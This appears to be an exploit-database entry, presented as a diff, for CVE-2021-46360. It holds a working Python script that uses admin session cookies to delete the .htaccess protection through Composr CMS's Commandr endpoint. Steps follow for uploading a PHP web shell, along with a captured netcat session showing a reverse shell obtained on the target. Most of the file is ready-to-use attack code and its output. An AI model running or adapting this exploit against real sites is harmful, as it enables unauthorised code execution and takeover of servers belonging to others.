@@ -1,0 +1,77 @@
+id: 38307
+date: 03/27/2023
+title: Composr CMS Version <=10.0.39 - Authenticated Remote Code Execution Exploit
+author: Sarang Tumne
+cves: CVE-2021-46360
+
+# Exploit Title: Composr-CMS Version <=10.0.39 - Authenticated Remote Code Execution
+# Exploit Author: Sarang Tumne @CyberInsane (Twitter: @thecyberinsane)
+# Date: 12th January,2022
+# CVE ID: CVE-2021-46360
+# Confirmed on release 10.0.39 using XAMPP on Ubuntu Linux 20.04.3 LTS
+# Reference: https://github.com/sartlabs/0days/blob/main/Composr-CMS/Exploit.py
+# Vendor: https://compo.sr/download.htm
+
+###############################################
+#Step1- We should have the admin credentials, once we logged in, we can disable the php file uploading protection, you can also do this manually via Menu- Tools=>Commandr
+
+#!/usr/bin/python3
+import requests
+from bs4 import BeautifulSoup
+import time
+
+cookies = {
+    'has_cookies': '1',
+    'PHPSESSID': 'ddf2e7c8ff1000a7c27b132b003e1f5c',                   #You need to change this as it is dynamic
+    'commandr_dir': 'L3Jhdy91cGxvYWRzL2ZpbGVkdW1wLw%3D%3D',
+    'last_visit': '1641783779',
+    'cms_session__b804794760e0b94ca2d3fac79ee580a9': 'ef14cc258d93a',  #You need to change this as it is dynamic
+}
+
+headers = {
+    'Connection': 'keep-alive',
+    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36',
+    'Content-Type': 'application/x-www-form-urlencoded',
+    'Accept': '*/*',
+    'Origin': 'http://192.168.56.116',
+    'Referer': 'http://192.168.56.116/composr-cms/adminzone/index.php?page=admin-commandr',
+    'Accept-Language': 'en-US,en;q=0.9',
+}
+
+params = (
+    ('keep_session', 'ef14cc258d93a'), #You need to change this as it is dynamic
+)
+
+data = {
+  '_data': 'command=rm .htaccess',  # This command will delete the .htaccess means disables the protection so that we can upload the .php extension file (Possibly the php shell)
+  'csrf_token': 'ef14cc258d93a'  #You need to change this as it is dynamic
+}
+
+
+r = requests.post('http://192.168.56.116/composr-cms/data/commandr.php?keep_session=ef14cc258d93a', headers=headers, params=params, cookies=cookies, data=data, verify=False)
+soup = BeautifulSoup(r.text, 'html.parser')
+#datap=response.read()
+print (soup)
+    
+#Step2- Now visit the Content=>File/Media Library and then upload any .php web shell (
+#Step 3 Now visit http://IP_Address/composr-cms/uploads/filedump/php-reverse-shell.php and get the reverse shell:
+
+┌─[ci@parrot]─[~]
+└──╼ $nc -lvvnp 4444
+listening on [any] 4444 ...
+connect to [192.168.56.103] from (UNKNOWN) [192.168.56.116] 58984
+Linux CVE-Hunting-Linux 5.11.0-44-generic #48~20.04.2-Ubuntu SMP Tue Dec 14 15:36:44 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
+ 13:35:13 up 20:11,  1 user,  load average: 0.00, 0.01, 0.03
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+user     :0       :0               Thu17   ?xdm?  46:51   0.04s /usr/lib/gdm3/gdm-x-session --run-script env GNOME_SHELL_SESSION_MODE=ubuntu /usr/bin/gnome-session --systemd --session=ubuntu
+uid=1(daemon) gid=1(daemon) groups=1(daemon)
+/bin/sh: 0: can't access tty; job control turned off
+$ whoami
+daemon
+$ id
+uid=1(daemon) gid=1(daemon) groups=1(daemon)
+$ pwd
+/
+$
+
+#  0day.today [2023-04-03]  #
